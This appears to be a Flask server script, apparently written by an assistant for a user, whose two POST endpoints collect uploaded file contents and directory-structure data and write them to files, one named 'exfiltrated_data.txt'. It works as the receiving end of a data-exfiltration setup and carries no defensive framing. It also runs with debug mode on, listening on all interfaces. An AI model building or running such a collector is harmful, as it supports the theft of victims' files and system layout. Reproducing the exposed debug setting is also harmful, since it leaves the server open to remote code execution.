from flask import Flask, request, jsonify

app = Flask(__name__)

# Endpoint for handling logs (from your original request)
@app.route('/logs', methods=['POST'])
def handle_logs():
    file_data = request.form.get('file')  # Retrieve the 'file' from the form data
    print(f"Received file: {file_data}")
    # Optionally, save the file data to a file (if needed)
    with open("received_files.txt", "a") as f:
        f.write(f"{file_data}\n")
    return "OK", 200

# Endpoint for receiving directory structure data
@app.route('/structure', methods=['POST'])
def receive_structure():
    data = request.get_json()  # Parse JSON data
    print(f"Received data: {data}")
    # Optionally, save to a file
    with open("exfiltrated_data.txt", "a") as f:
        f.write(f"{data}\n")
    return jsonify({"status": "success"}), 200

if __name__ == '__main__':
    # Enable debug mode
    app.debug = True
    app.run(host='0.0.0.0', port=8000)

